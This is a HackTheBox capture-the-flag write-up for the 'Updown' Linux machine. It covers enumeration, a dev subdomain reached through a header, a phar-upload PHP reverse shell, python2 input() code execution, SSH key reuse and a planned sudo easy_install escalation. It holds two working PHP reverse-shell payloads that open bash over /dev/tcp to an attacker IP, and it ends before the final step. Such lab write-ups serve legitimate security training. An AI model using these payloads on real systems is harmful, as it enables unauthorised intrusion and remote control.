---
title: "Updown"
date: 2026-01-14
draft: false
description: "HackTheBox Updown writeup"
tags: ["hackthebox", "htb", "linux", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Updown

## Overview

- **OS:** Linux
- **IP:** 10.129.37.232
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got access via discovered subdomain which we accessed by modifying a header and then we uploaded a phar file access phar file content to get our rev shell, esclated priv by python2 input func rce which gave us access to developer, grabbed rsa key ssh in and ppriv esc again by using a script from gtfo bin for easy install that we had sudo perms to.

## Loot

| Takeaways |  |  |
| --- | --- | --- |
| Username +Passwords |  |  |
|  |  |  |

## Enumeration
- **nmap**

{{< figure src="image 300.png" >}}

- **80**


Homepage on 80

{{< figure src="image 301.png" >}}

Debug just gives us the pages source code hmmm

{{< figure src="image 302.png" >}}

/dev shows nothing

{{< figure src="image 303.png" >}}

We find this subdomain called dev

{{< figure src="image 304.png" >}}

using gobuster on dev we get these

gobuster dir -u [http://siteisup.htb/dev](http://siteisup.htb/dev) -w /usr/share/wordlists/dirb/common.txt

{{< figure src="image 305.png" >}}

## Vulnerabilities


## Exploitation


we find that we can access the dev subdomain with a special header by klooking at .htaccess which we got from dumping git with gitdumper ( dev/.git/ ) so lets check it out

{{< figure src="image 306.png" >}}

func blacklist

```
    <?php 
    
    $descriptorspec = [ 
    
        0 => ["pipe", "r"],  // STDIN 
    
        1 => ["pipe", "w"],  // STDOUT 
    
        2 => ["pipe", "w"],  // STDERR 
    
    ]; 
    
    $command = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/1234 0>&1'"; 
    
    $process = proc_open($command, $descriptorspec, $pipes); 
    
    if (is_resource($process)) { 
    
        fclose($pipes[0]); // Close STDIN 
    
        fclose($pipes[1]); // Close STDOUT 
    
        fclose($pipes[2]); // Close STDERR 
    
        proc_close($process); 
    
    } 
    
    ?>
```

{{< figure src="image 307.png" >}}

php rev shell without fsockopen() and exec() )

```
    <?php
            $descspec = array(
                    0 => array("pipe", "r"),
                    1 => array("pipe", "w"),
                    2 => array("pipe", "w")
            );
            $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1'";
            $proc = proc_open($cmd, $descspec, $pipes);
    ?>
```



after uploading this we access the lnk nd use the phar file like this

```
    http://dev.siteisup.htb/?page=phar://uploads/92d9d308ef1ac5fca2cef03d095afd9b/attempt.rob/attempt
```

we are going to escalate liket his
}

bad writeup but anyways gonna escalate with python2 input rce

```
    __import__('os').system('bash')
```


Lets add ssh and grab our rsa key

cd into ssh

vi developer.id_rsa and copy it there in our home user

give it perms with chmod 600

ssh -i developer.id_rsa developer@siteisup.htb

we can run easy_install with sudo when we check with sudo-l

lets check gtfo bins to check if there is anything with sudo
